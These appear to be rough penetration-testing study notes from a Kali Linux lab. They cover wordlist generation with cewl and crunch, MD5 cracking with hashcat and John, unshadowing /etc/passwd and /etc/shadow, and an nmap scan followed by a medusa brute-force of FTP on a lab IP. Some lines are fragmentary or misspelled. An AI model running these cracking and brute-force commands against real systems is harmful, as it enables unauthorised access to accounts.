### Creating a Wordlist

```cewl www.\\\\\\.com -w /root/Desktop/wordlist.txt```

### Hashed password cracking

- Hashcat

```hashcat -a 3 -m 0 /root/Desktop/md5.txt /root/Desktop/wordlist.txt```

---
Jhon

Password Attack <br>
Offline Attacks <br>
Hash-�dent <br>
Hash:... <br>

Pa <br>
John <br>
john --list=formats <br>
john --list=format=Raw-MD5 --wordlist=/root/Desktop/wordlist.txt /root/Desktop/md5.txt <br>

---
### Crunch (Creating Password)

```crunch 5 6 qwe123 -o /root/Desktop/wordlist.txt```

### Johnny (Finding Users' Passwords in Kali Linux)

```
unshadow
unshadow /etc/passwd /etc/shadow > /root/Desktop/user.txt
Johny
File
```

- (Attacks on Services)

```
nmap -p 21 10.0.2.5
medusa -h 10.0.2.5 -m ftp -U /root/Desktop/ad.txt -P /root/Desktop/password.txt
```